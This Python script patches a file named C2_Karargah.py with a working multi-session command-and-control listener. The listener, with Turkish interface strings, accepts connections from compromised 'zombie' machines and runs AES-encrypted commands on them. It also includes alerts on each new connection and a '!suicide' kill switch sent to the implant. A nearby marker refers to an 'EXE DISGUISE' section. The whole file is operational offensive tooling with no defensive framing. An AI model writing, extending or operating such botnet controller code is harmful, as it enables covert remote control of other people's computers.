import os
import re

file_path = 'C2_Karargah.py'
with open(file_path, 'r', encoding='utf-8') as f:
    content = f.read()

# Add threading import if missing
if 'import threading' not in content:
    content = content.replace('import socket', 'import socket\nimport threading\nimport time')

new_listener = '''
active_sessions = {}
session_counter = 1

def c2_listener():
    global active_sessions, session_counter
    clear_screen()
    print_banner()
    print(f"{C.YELLOW}[*] C2 Multi-Session Listener{C.RESET}\\n")
    print_line()
    
    port_str = input(f"{C.CYAN}  [?] Dinlenecek Port: {C.RESET}").strip()
    if not port_str.isdigit():
        return
    port = int(port_str)

    aes_key = None
    key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Moduller/Sistem/c2_aes_key.txt")
    if os.path.exists(key_path):
        with open(key_path, "r") as f:
            aes_key = f.read().strip().encode('utf-8')
        print(f"{C.GREEN}  [+] Mevcut AES-256 Anahtarı yüklendi.{C.RESET}")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(100)

    print(f"\\n{C.GREEN}  [*] 0.0.0.0:{port} dinleniyor... (Arka planda çalışıyor){C.RESET}")
    
    # Accept connections in a thread
    def accept_thread():
        global session_counter
        while True:
            try:
                conn, addr = s.accept()
                conn.settimeout(None) # blocking
                sid = session_counter
                session_counter += 1
                active_sessions[sid] = {"conn": conn, "addr": addr, "key": aes_key}
                
                try:
                    import Moduller.Sistem.Bildirim_Sistemi
                    Moduller.Sistem.Bildirim_Sistemi.send_alert(f"⚠️ YENİ BİR ZOMBİ BAĞLANDI!\\n\\nIP Adresi: {addr[0]}\\nPort: {addr[1]}\\nSession ID: {sid}", title="🚀 C2 BAĞLANTISI BAŞARILI")
                except: pass
                
                print(f"\\n{C.RED}{C.BOLD}  [!] YENİ ZOMBİ BAĞLANDI: Session {sid} ({addr[0]}:{addr[1]}){C.RESET}")
                print(f"{C.RED}C2-Karargah>{C.RESET} ", end="", flush=True)
            except:
                break
    
    t = threading.Thread(target=accept_thread, daemon=True)
    t.start()
    
    time.sleep(1)
    
    while True:
        try:
            cmd = input(f"\\n{C.RED}C2-Karargah>{C.RESET} ").strip()
            
            if cmd == "sessions":
                print(f"\\n{C.CYAN}--- AKTİF ZOMBİLER ---{C.RESET}")
                if not active_sessions:
                    print(f"{C.DIM}Hiç aktif oturum yok.{C.RESET}")
                for sid, sess in list(active_sessions.items()):
                    print(f"[{sid}] {sess['addr'][0]}:{sess['addr'][1]}")
                print(f"{C.CYAN}----------------------{C.RESET}")
            
            elif cmd.startswith("interact "):
                try:
                    sid = int(cmd.split(" ")[1])
                    if sid in active_sessions:
                        interact_with_session(sid)
                    else:
                        print(f"{C.RED}  [-] Oturum bulunamadı.{C.RESET}")
                except:
                    print(f"{C.RED}  [-] Kullanım: interact <id>{C.RESET}")
            
            elif cmd in ["exit", "quit", "background"]:
                break
            elif not cmd:
                continue
            else:
                print(f"{C.YELLOW}  [-] Bilinmeyen komut. Kullanılabilir: sessions, interact <id>, exit{C.RESET}")
                
        except KeyboardInterrupt:
            break

    s.close()

def send_and_recv(conn, cmd, aes_key):
    if aes_key:
        conn.sendall(encrypt_aes(cmd, aes_key) + b"\\n")
    else:
        conn.sendall(cmd.encode("utf-8") + b"\\n")
        
    response = b""
    conn.settimeout(15)
    while True:
        try:
            chunk = conn.recv(65536)
            if not chunk: break
            response += chunk
            if b"\\n" in chunk: break
        except socket.timeout:
            break
    conn.settimeout(None)
    
    if not response: return None
    
    if aes_key:
        return decrypt_aes(response.strip(), aes_key)
    else:
        return response.decode("utf-8", errors="replace")

def interact_with_session(sid):
    global active_sessions
    sess = active_sessions[sid]
    conn = sess["conn"]
    aes_key = sess["key"]
    addr = sess["addr"]
    
    print(f"\\n{C.GREEN}[*] Session {sid} ({addr[0]}) ile etkileşime girildi. Çıkmak için 'background' yazın.{C.RESET}")
    
    while True:
        try:
            cmd = input(f"{C.RED}Zombi-{sid}>{C.RESET} ")
            if cmd == "background":
                break
                
            if cmd == "!PANIK":
                print(f"\\n{C.RED}{C.BOLD}  [☠️] KENDİNİ İMHA (KILL-SWITCH) BAŞLATILDI!{C.RESET}")
                try:
                    import Moduller.Sistem.Bildirim_Sistemi
                    Moduller.Sistem.Bildirim_Sistemi.send_alert(f"PANIC MODE ACTIVATED on {addr[0]}!", title="☠️ PANİK BUTONU TETİKLENDİ")
                except: pass
                send_and_recv(conn, "!suicide", aes_key)
                conn.close()
                del active_sessions[sid]
                break
                
            if not cmd.strip(): continue
            
            resp = send_and_recv(conn, cmd, aes_key)
            if resp is None:
                print(f"{C.RED}[-] Zombi ile bağlantı koptu!{C.RESET}")
                conn.close()
                del active_sessions[sid]
                break
                
            print(f"{C.WHITE}{resp}{C.RESET}")
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"{C.RED}[-] Hata: {e}{C.RESET}")
            break
'''

# Find c2_listener definition in content
start_idx = content.find('def c2_listener():')
end_idx = content.find('# ══════════════════════════════════════════════════════════\n#  EXE DISGUISE')

if start_idx != -1 and end_idx != -1:
    new_content = content[:start_idx] + new_listener + '\n' + content[end_idx:]
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write(new_content)
    print("Multi-Session patched!")
else:
    print("Could not find boundaries")
